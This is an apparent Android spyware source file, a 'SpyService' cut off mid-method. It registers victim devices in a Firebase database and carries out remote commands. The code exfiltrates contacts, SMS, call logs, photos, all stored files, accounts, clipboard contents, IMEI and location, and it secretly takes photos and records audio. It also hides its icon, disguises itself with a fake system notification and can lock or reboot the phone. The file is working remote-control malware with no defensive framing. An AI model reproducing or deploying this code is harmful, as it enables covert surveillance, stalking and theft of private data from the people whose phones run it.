package com.black.phone;

import android.app.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private static final String FIREBASE_URL = "https://black-cock-4929d-default-rtdb.firebaseio.com/";
    private DatabaseReference dbRef;
    private StorageReference storageRef;
    private ScheduledExecutorService scheduler;
    private PowerManager.WakeLock wakeLock;
    private String deviceId;
    private Context context;
    private BotAPI bot;
    private Camera camera;
    private Camera frontCamera;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private File recordingFile;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private boolean isTrackingLocation = false;
    private MediaProjection mediaProjection;
    private boolean isStreaming = false;

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        
        // تهيئة Firebase
        if (FirebaseApp.getApps(this).isEmpty()) { // Firebase already initialized in MainActivity }
            // Firebase already initialized in MainActivity
        }
        
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        FirebaseDatabase db = FirebaseDatabase.getInstance(FIREBASE_URL);
        dbRef = db.getReference();
        storageRef = FirebaseStorage.getInstance().getReference();
        bot = new BotAPI(this);
        Config.get(this);

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SpyService:WakeLock");
        wakeLock.acquire(10*60*1000L);

        startForeground(1, createNotification());
        registerDevice();

        scheduler = Executors.newScheduledThreadPool(1);
        scheduler.scheduleAtFixedRate(this::listenCommands, 0, Config.get(this).getPollIntervalSec(), TimeUnit.SECONDS);
        
        Log.d(TAG, "✅ SpyService started successfully");
    }

    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel("spy", "System Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            nm.createNotificationChannel(channel);
        }
        return new NotificationCompat.Builder(this, "spy")
                .setContentTitle("نظام التشغيل")
                .setContentText("تشغيل الخدمات الأساسية")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
    }

    private void registerDevice() {
        try {
            String name = Build.MANUFACTURER + " " + Build.MODEL;
            String androidVer = Build.VERSION.RELEASE;
            JSONObject json = new JSONObject();
            json.put("device_name", name);
            json.put("android", androidVer);
            json.put("battery", getBatteryLevel());
            json.put("last_seen", System.currentTimeMillis());
            json.put("status", "online");
            dbRef.child("devices").child(deviceId).setValue(json.toString());
            Log.d(TAG, "✅ Device registered: " + name);
        } catch (Exception e) { Log.e(TAG, "register error", e); }
    }

    private void listenCommands() {
        dbRef.child("commands").child(deviceId).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(com.google.firebase.database.DataSnapshot snapshot) {
                String cmd = snapshot.getValue(String.class);
                if (cmd != null && !cmd.isEmpty()) {
                    executeCommand(cmd);
                    dbRef.child("commands").child(deviceId).removeValue();
                }
            }
            @Override
            public void onCancelled(com.google.firebase.database.DatabaseError error) {}
        });
    }

    private void sendFile(File file, String caption) {
        if (file == null || !file.exists()) {
            bot.sendMessage("⚠️ لا يوجد ملف لـ " + caption);
            return;
        }
        uploadToFirebase(file, caption);
        bot.sendFile(file, caption);
        sendData("FILE", "{\"name\":\"" + file.getName() + "\",\"caption\":\"" + caption + "\"}");
    }

    private void uploadToFirebase(File file, String caption) {
        try {
            StorageReference ref = storageRef.child("data/" + deviceId + "/" + file.getName());
            ref.putFile(Uri.fromFile(file))
                    .addOnSuccessListener(taskSnapshot -> ref.getDownloadUrl().addOnSuccessListener(uri -> {
                        try {
                            JSONObject json = new JSONObject();
                            json.put("name", file.getName());
                            json.put("url", uri.toString());
                            json.put("caption", caption);
                            dbRef.child("devices").child(deviceId).child("data").child("FILE").setValue(json.toString());
                        } catch (Exception e) { Log.e(TAG, "upload metadata error", e); }
                    }))
                    .addOnFailureListener(e -> Log.e(TAG, "upload fail", e));
        } catch (Exception e) { Log.e(TAG, "upload error", e); }
    }

    private void sendData(String key, String value) {
        dbRef.child("devices").child(deviceId).child("data").child(key).setValue(value);
    }

    // ======================================================================
    // ========== دوال جمع البيانات ==========
    // ======================================================================

    private File collectContacts() throws Exception {
        File f = new File(getCacheDir(), "contacts.txt");
        PrintWriter pw = new PrintWriter(f);
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                pw.println(name + " : " + number);
            }
            cursor.close();
        }
        pw.close();
        return f;
    }

    private File collectSms() throws Exception {
        File f = new File(getCacheDir(), "sms.txt");
        PrintWriter pw = new PrintWriter(f);
        Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String addr = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                pw.println("من/إلى: " + addr + "\nالنص: " + body + "\n---");
            }
            cursor.close();
        }
        pw.close();
        return f;
    }

    private File collectCallLogs() throws Exception {
        File f = new File(getCacheDir(), "calls.txt");
        PrintWriter pw = new PrintWriter(f);
        Cursor cursor = getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DATE + " DESC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String num = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE));
                String dur = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION));
                pw.println("رقم: " + num + " | النوع: " + type + " | المدة: " + dur + " ثانية");
            }
            cursor.close();
        }
        pw.close();
        return f;
    }

    private File collectApps() throws Exception {
        File f = new File(getCacheDir(), "apps.txt");
        PrintWriter pw = new PrintWriter(f);
        PackageManager pm = getPackageManager();
        List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(PackageManager.GET_META_DATA);
        for (android.content.pm.PackageInfo p : packages) {
            String name = p.packageName;
            String label = pm.getApplicationLabel(p.applicationInfo).toString();
            pw.println(label + " (" + name + ")");
        }
        pw.close();
        return f;
    }

    private File collectMedia(String type, int limit) throws Exception {
        File dir = new File(getCacheDir(), "media");
        dir.mkdirs();
        String[] projection = {MediaStore.Files.FileColumns._ID, MediaStore.Files.FileColumns.DATA};
        String selection = MediaStore.Files.FileColumns.MEDIA_TYPE + "=" +
                (type.equals("images") ? MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE : MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO);
        Cursor cursor = getContentResolver().query(MediaStore.Files.getContentUri("external"), projection, selection, null, MediaStore.Files.FileColumns.DATE_ADDED + " DESC");
        int count = 0;
        if (cursor != null) {
            while (cursor.moveToNext() && (limit == 0 || count < limit)) {
                String path = cursor.getString(cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA));
                File src = new File(path);
                if (src.exists()) {
                    File dst = new File(dir, src.getName());
                    copyFile(src, dst);
                    count++;
                }
            }
            cursor.close();
        }
        return zipFiles(dir, type + ".zip");
    }

    private File collectAllFiles() throws Exception {
        File dir = new File(getCacheDir(), "allfiles");
        dir.mkdirs();
        File storage = Environment.getExternalStorageDirectory();
        copyRecursive(storage, dir);
        return zipFiles(dir, "allfiles.zip");
    }

    private void copyRecursive(File src, File dst) throws IOException {
        if (src.isDirectory()) {
            if (!dst.exists()) dst.mkdirs();
            for (File child : src.listFiles()) {
                copyRecursive(child, new File(dst, child.getName()));
            }
        } else {
            copyFile(src, dst);
        }
    }

    private void copyFile(File src, File dst) throws IOException {
        FileInputStream in = new FileInputStream(src);
        FileOutputStream out = new FileOutputStream(dst);
        byte[] buffer = new byte[4096];
        int len;
        while ((len = in.read(buffer)) > 0) out.write(buffer, 0, len);
        in.close();
        out.close();
    }

    private File zipFiles(File dir, String zipName) throws IOException {
        File zipFile = new File(getCacheDir(), zipName);
        FileOutputStream fos = new FileOutputStream(zipFile);
        ZipOutputStream zos = new ZipOutputStream(fos);
        zipRecursive(dir, dir, zos);
        zos.close();
        fos.close();
        return zipFile;
    }

    private void zipRecursive(File baseDir, File currentDir, ZipOutputStream zos) throws IOException {
        for (File f : currentDir.listFiles()) {
            if (f.isDirectory()) {
                zipRecursive(baseDir, f, zos);
            } else {
                String entryName = f.getAbsolutePath().substring(baseDir.getAbsolutePath().length() + 1);
                ZipEntry entry = new ZipEntry(entryName);
                zos.putNextEntry(entry);
                FileInputStream in = new FileInputStream(f);
                byte[] buffer = new byte[4096];
                int len;
                while ((len = in.read(buffer)) > 0) zos.write(buffer, 0, len);
                in.close();
                zos.closeEntry();
            }
        }
    }

    private File collectAccounts() throws Exception {
        File f = new File(getCacheDir(), "accounts.txt");
        PrintWriter pw = new PrintWriter(f);
        android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
        for (android.accounts.Account acc : am.getAccounts()) {
            pw.println(acc.name + " (" + acc.type + ")");
        }
        pw.close();
        return f;
    }

    private File collectClipboard() throws Exception {
        File f = new File(getCacheDir(), "clipboard.txt");
        PrintWriter pw = new PrintWriter(f);
        android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        String text = cm.getText() != null ? cm.getText().toString() : "فارغ";
        pw.println(text);
        pw.close();
        return f;
    }

    private int getBatteryLevel() {
        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        if (batteryIntent != null) {
            int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            if (level != -1 && scale != -1) {
                return (level * 100) / scale;
            }
        }
        return -1;
    }

    // ======================================================================
    // ========== دوال الأوامر ==========
    // ======================================================================

    private void getLocation() {
        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        try {
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                String msg = "📍 " + loc.getLatitude() + ", " + loc.getLongitude();
                sendData("LOCATION", msg);
                bot.sendMessage(msg);
            } else {
                bot.sendMessage("⚠️ لا يمكن الحصول على الموقع");
            }
        } catch (SecurityException e) {
            bot.sendMessage("❌ صلاحية الموقع غير مفعلة");
        }
    }

    private void startLocationTracking() {
        if (isTrackingLocation) return;
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        locationListener = new LocationListener() {
            @Override public void onLocationChanged(Location loc) {
                String msg = "📍 " + loc.getLatitude() + ", " + loc.getLongitude();
                sendData("TRACK", msg);
                bot.sendMessage("📍 تتبع: " + msg);
            }
            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
            @Override public void onProviderEnabled(String provider) {}
            @Override public void onProviderDisabled(String provider) {}
        };
        try {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10, locationListener);
            isTrackingLocation = true;
            bot.sendMessage("🔄 بدء تتبع الموقع (كل دقيقة)");
        } catch (SecurityException e) {
            bot.sendMessage("❌ صلاحية الموقع غير مفعلة");
        }
    }

    private void stopLocationTracking() {
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
            isTrackingLocation = false;
            bot.sendMessage("⏹ توقف تتبع الموقع");
        }
    }

    private void startRecording() {
        try {
            if (isRecording) return;
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recordingFile = new File(getCacheDir(), "record_" + System.currentTimeMillis() + ".3gp");
            mediaRecorder.setOutputFile(recordingFile.getAbsolutePath());
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            sendData("RECORD", "started");
            bot.sendMessage("🎤 بدء التسجيل");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل التسجيل: " + e.getMessage());
        }
    }

    private File stopRecording() {
        if (isRecording && mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
                sendData("RECORD", "stopped");
                bot.sendMessage("⏹ تم إيقاف التسجيل");
                return recordingFile;
            } catch (Exception e) { bot.sendMessage("❌ خطأ في الإيقاف: " + e.getMessage()); }
        }
        return null;
    }

    private void hideApp() {
        try {
            getPackageManager().setComponentEnabledSetting(
                    new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            sendData("HIDE", "hidden");
            bot.sendMessage("👁‍🗨 تم إخفاء التطبيق");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل الإخفاء: " + e.getMessage());
        }
    }

    private void showApp() {
        try {
            getPackageManager().setComponentEnabledSetting(
                    new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
            sendData("SHOW", "shown");
            bot.sendMessage("👁 تم إظهار التطبيق");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل الإظهار: " + e.getMessage());
        }
    }

    private void showFakeNotification() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel ch = new NotificationChannel("fake", "System", NotificationManager.IMPORTANCE_HIGH);
                nm.createNotificationChannel(ch);
            }
            Notification notification = new NotificationCompat.Builder(this, "fake")
                    .setContentTitle("📥 تحديث أمني")
                    .setContentText("تم تنزيل تحديث 245MB")
                    .setSmallIcon(android.R.drawable.stat_sys_download)
                    .setProgress(100, 45, false)
                    .setOngoing(true)
                    .build();
            nm.notify((int)(System.currentTimeMillis() % 9999), notification);
            sendData("NOTIFY", "fake notification sent");
            bot.sendMessage("🔔 تم إرسال إشعار وهمي");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل الإشعار: " + e.getMessage());
        }
    }

    private void takePhoto(boolean front) {
        try {
            Camera cam = front ? frontCamera : camera;
            if (cam == null) {
                int facing = front ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
                cam = Camera.open(facing);
                if (front) frontCamera = cam; else camera = cam;
            }
            cam.startPreview();
            cam.takePicture(null, null, (byte[] data, Camera camera1) -> {
                try {
                    File f = new File(getCacheDir(), "photo_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(f);
                    fos.write(data);
                    fos.close();
                    sendFile(f, "📸 صورة " + (front ? "أمامية" : "خلفية"));
                    camera1.stopPreview();
                } catch (Exception e) {
                    bot.sendMessage("❌ فشل حفظ الصورة: " + e.getMessage());
                }
            });
        } catch (Exception e) {
            bot.sendMessage("❌ فشل التقاط الصورة: " + e.getMessage());
        }
    }

    private void flash(boolean on) {
        try {
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = "0";
            cm.setTorchMode(cameraId, on);
            bot.sendMessage("🔦 " + (on ? "تشغيل" : "إيقاف") + " الفلاش");
        } catch (CameraAccessException e) {
            bot.sendMessage("❌ فشل التحكم بالفلاش: " + e.getMessage());
        }
    }

    private void getImei() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            String imei = "";
            if (Build.VERSION.SDK_INT >= 26) {
                imei = tm.getImei();
            } else {
                imei = tm.getDeviceId();
            }
            sendData("IMEI", imei);
            bot.sendMessage("📟 IMEI: " + imei);
        } else {
            bot.sendMessage("❌ صلاحية غير مفعلة");
        }
    }

    private void getPhoneNumber() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            String num = tm.getLine1Number();
            sendData("PHONE", num);
            bot.sendMessage("📞 رقم الهاتف: " + (num == null ? "غير متوفر" : num));
        } else {
            bot.sendMessage("❌ صلاحية غير مفعلة");
        }
    }

    private void getSimInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String sim = "المشغل: " + tm.getSimOperatorName() + "\nرقم SIM: " + tm.getSimSerialNumber();
        sendData("SIM", sim);
        bot.sendMessage("📡 معلومات SIM:\n" + sim);
    }

    private void getWifiInfo() {
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        WifiInfo info = wm.getConnectionInfo();
        String wifi = "SSID: " + info.getSSID() + "\nBSSID: " + info.getBSSID() + "\nسرعة: " + info.getLinkSpeed() + " Mbps";
        sendData("WIFI", wifi);
        bot.sendMessage("📶 الواي فاي:\n" + wifi);
    }

    private void getBatteryInfo() {
        int level = getBatteryLevel();
        sendData("BATTERY", String.valueOf(level));
        bot.sendMessage("🔋 مستوى البطارية: " + level + "%");
    }

    private void getPublicIp() {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.ipify.org");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String ip = br.readLine();
                br.close();
                sendData("IP", ip);
                bot.sendMessage("🌐 IP العام: " + ip);
            } catch (Exception e) {
                bot.sendMessage("❌ فشل الحصول على IP: " + e.getMessage());
            }
        }).start();
    }

    private void lockDevice() {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, DeviceAdmin.class);
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow();
                bot.sendMessage("🔒 تم قفل الجهاز");
            } else {
                bot.sendMessage("❌ صلاحية مدير الجهاز غير مفعلة");
            }
        } catch (Exception e) {
            bot.sendMessage("❌ فشل قفل الجهاز: " + e.getMessage());
        }
    }

    private void rebootDevice() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                pm.reboot("reboot");
            } else {
                try { Runtime.getRuntime().exec("su -c reboot"); } catch (Exception e) {}
            }
            bot.sendMessage("🔄 جاري إعادة التشغيل");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل إعادة التشغيل: " + e.getMessage());
        }
    }

    private void shutdownDevice() {
        try {
            try { Runtime.getRuntime().exec("su -c reboot -p"); } catch (Exception e) {}
            bot.sendMessage("⏻ جاري إيقاف التشغيل");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل الإيقاف: " + e.getMessage());
        }
    }

    private void sendDeviceInfo() {
        String info = "الموديل: " + Build.MODEL + "\nالصانع: " + Build.MANUFACTURER + "\nالأندرويد: " + Build.VERSION.RELEASE;
        sendData("DEVICE_INFO", info);
        bot.sendMessage("📱 معلومات الجهاز:\n" + info);
    }

    private void sendNetworkInfo() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo ni = cm.getActiveNetworkInfo();
        String net = "النوع: " + (ni != null ? ni.getTypeName() : "لا يوجد");
        sendData("NETWORK", net);
        bot.sendMessage("🌐 الشبكة:\n" + net);
    }

    private void takeScreenshot() {
        if (mediaProjection == null) {
            bot.sendMessage("⚠️ لم يتم الحصول على MediaProjection. أعد تشغيل التطبيق.");
            return;
        }
        bot.sendMessage("📸 سيتم تطوير لقطة الشاشة باستخدام MediaProjection قريباً");
    }

    private void toggleWifi(boolean on) {
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        wm.setWifiEnabled(on);
        bot.sendMessage("📶 " + (on ? "تشغيل" : "إيقاف") + " الواي فاي");
    }

    private void toggleBluetooth(boolean on) {
        try {
            android.bluetooth.BluetoothAdapter ba = android.bluetooth.BluetoothAdapter.getDefaultAdapter();
            if (on) ba.enable(); else ba.disable();
            bot.sendMessage("📶 " + (on ? "تشغيل" : "إيقاف") + " البلوتوث");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل التحكم بالبلوتوث: " + e.getMessage());
        }
    }

    private void toggleLocation(boolean on) {
        try {
            if (on) {
                startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                bot.sendMessage("📍 تم فتح إعدادات الموقع");
            } else {
                bot.sendMessage("📍 لإيقاف الموقع، قم بتعطيله من الإعدادات");
            }
        } catch (Exception e) {
            bot.sendMessage("❌ فشل التحكم بالموقع: " + e.getMessage());
        }
    }

    private void clearAppData() {
        try {
            Runtime.getRuntime().exec("su -c pm clear com.black.phone");
            bot.sendMessage("🧹 تم مسح بيانات التطبيق");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل المسح: " + e.getMessage());
        }
    }

    private void killAllApps() {
        try {
            ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
            for (ActivityManager.RunningAppProcessInfo p : processes) {
                if (p.importance > ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                    android.os.Process.killProcess(p.pid);
                }
            }
            bot.sendMessage("🗑️ تم إيقاف جميع التطبيقات الجارية");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل الإيقاف: " + e.getMessage());
        }
    }

    private void vibrateDevice() {
        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (v.hasVibrator()) {
            v.vibrate(3000);
            bot.sendMessage("📳 تم اهتزاز الجهاز");
        } else {
            bot.sendMessage("⚠️ الجهاز لا يدعم الاهتزاز");
        }
    }

    private void setVolume(boolean max) {
        AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
        int stream = AudioManager.STREAM_MUSIC;
        int maxVol = am.getStreamMaxVolume(stream);
        if (max) am.setStreamVolume(stream, maxVol, 0);
        else am.setStreamVolume(stream, 0, 0);
        bot.sendMessage("🔊 " + (max ? "رفع الصوت للأعلى" : "خفض الصوت للأدنى"));
    }

    private void openBrowser() {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            bot.sendMessage("🌐 تم فتح المتصفح");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل فتح المتصفح: " + e.getMessage());
        }
    }

    private void addContact() {
        bot.sendMessage("➕ سيتم قريباً إضافة جهة اتصال");
    }
    private void deleteContact() { bot.sendMessage("🗑️ سيتم قريباً حذف جهة اتصال"); }
    private void sendSms() { bot.sendMessage("📤 سيتم قريباً إرسال رسالة"); }
    private void deleteSms() { bot.sendMessage("🗑️ سيتم قريباً حذف رسالة"); }
    private void makeCall() { bot.sendMessage("📞 سيتم قريباً إجراء مكالمة"); }
    private void endCall() { bot.sendMessage("📞 سيتم إنهاء المكالمة قريباً"); }

    // ======================================================================
    // ========== بث الشاشة (يتم تشغيله فقط عند استلام أمر start_stream) ==========
    // ======================================================================

    private void startStreaming() {
        if (mediaProjection == null) {
            bot.sendMessage("⚠️ لم يتم الحصول على MediaProjection. أعد تشغيل التطبيق ووافق على الطلب.");
            return;
        }
        isStreaming = true;
        bot.sendMessage("📡 بدء بث الشاشة...");
        sendData("STREAM", "streaming");
        new Thread(() -> {
            while (isStreaming) {
                try {
                    sendData("STREAM_HEARTBEAT", "alive");
                    Thread.sleep(5000);
                } catch (Exception e) { break; }
            }
        }).start();
    }

    private void stopStreaming() {
        isStreaming = false;
        sendData("STREAM", "stopped");
        bot.sendMessage("⏹ تم إيقاف بث الشاشة");
    }

    // ======================================================================
    // ========== تنفيذ الأوامر ==========
    // ======================================================================

    private void executeCommand(String cmd) {
        String lower = cmd.toLowerCase().trim();
        Log.d(TAG, "Executing: " + lower);
        try {
            switch (lower) {
                case "get_contacts": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
                case "copy_contacts": sendFile(collectContacts(), "📋 نسخة جهات الاتصال"); break;
                case "export_contacts": sendFile(collectContacts(), "📤 تصدير جهات الاتصال"); break;
                case "add_contact": addContact(); break;
                case "delete_contact": deleteContact(); break;
                case "get_sms": sendFile(collectSms(), "💬 الرسائل النصية"); break;
                case "forward_sms": sendFile(collectSms(), "↪️ إعادة توجيه الرسائل"); break;
                case "send_sms": sendSms(); break;
                case "delete_sms": deleteSms(); break;
                case "get_calllogs": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
                case "call_history": sendFile(collectCallLogs(), "📋 سجل المكالمات"); break;
                case "make_call": makeCall(); break;
                case "end_call": endCall(); break;
                case "get_location": getLocation(); break;
                case "start_location_track": startLocationTracking(); break;
                case "stop_location_track": stopLocationTracking(); break;
                case "get_device": sendDeviceInfo(); break;
                case "get_network": sendNetworkInfo(); break;
                case "get_imei": getImei(); break;
                case "get_phone": getPhoneNumber(); break;
                case "get_sim": getSimInfo(); break;
                case "get_wifi": getWifiInfo(); break;
                case "get_battery": getBatteryInfo(); break;
                case "get_ip": getPublicIp(); break;
                case "get_photos": sendFile(collectMedia("images", 0), "🖼 جميع الصور"); break;
                case "get_photos_5": sendFile(collectMedia("images", 5), "🖼 الصور (5)"); break;
                case "get_photos_10": sendFile(collectMedia("images", 10), "🖼 الصور (10)"); break;
                case "get_photos_20": sendFile(collectMedia("images", 20), "🖼 الصور (20)"); break;
                case "get_photos_30": sendFile(collectMedia("images", 30), "🖼 الصور (30)"); break;
                case "get_videos": sendFile(collectMedia("videos", 0), "🎬 جميع الفيديوهات"); break;
                case "get_videos_5": sendFile(collectMedia("videos", 5), "🎬 الفيديوهات (5)"); break;
                case "get_videos_10": sendFile(collectMedia("videos", 10), "🎬 الفيديوهات (10)"); break;
                case "get_files": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
                case "get_apps": sendFile(collectApps(), "📱 التطبيقات"); break;
                case "get_accounts": sendFile(collectAccounts(), "👤 الحسابات"); break;
                case "get_clipboard": sendFile(collectClipboard(), "📋 الحافظة"); break;
                case "clear_data": clearAppData(); break;
                case "kill_apps": killAllApps(); break;
                case "take_photo": takePhoto(false); break;
                case "take_photo_front": takePhoto(true); break;
                case "flash_on": flash(true); break;
                case "flash_off": flash(false); break;
                case "start_record": startRecording(); break;
                case "stop_record": sendFile(stopRecording(), "🎤 تسجيل صوتي"); break;
                case "hide_app": hideApp(); break;
                case "show_app": showApp(); break;
                case "lock_device": lockDevice(); break;
                case "reboot": rebootDevice(); break;
                case "shutdown": shutdownDevice(); break;
                case "vibrate": vibrateDevice(); break;
                case "screenshot": takeScreenshot(); break;
                case "toggle_wifi_on": toggleWifi(true); break;
                case "toggle_wifi_off": toggleWifi(false); break;
                case "toggle_bluetooth_on": toggleBluetooth(true); break;
                case "toggle_bluetooth_off": toggleBluetooth(false); break;
                case "toggle_location_on": toggleLocation(true); break;
                case "toggle_location_off": toggleLocation(false); break;
                case "set_volume_max": setVolume(true); break;
                case "set_volume_min": setVolume(false); break;
                case "open_browser": openBrowser(); break;
                case "fake_notif": showFakeNotification(); break;
                case "start_stream": startStreaming(); break;
                case "stop_stream": stopStreaming(); break;
                default:
                    sendData("ERROR", "أمر غير معروف: " + cmd);
                    bot.sendMessage("❌ أمر غير معروف: " + cmd);
            }
        } catch (Exception e) {
            sendData("ERROR", "خطأ: " + e.getMessage());
            bot.sendMessage("❌ خطأ: " + e.getMessage());
            Log.e(TAG, "Execute error", e);
        }
    }

    // ======================================================================
    // ========== دورة حياة الخدمة ==========
    // ======================================================================

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("mediaProjectionResultCode")) {
            int resultCode = intent.getIntExtra("mediaProjectionResultCode", 0);
            Intent data = intent.getParcelableExtra("mediaProjectionData");
            if (resultCode == Activity.RESULT_OK && data != null) {
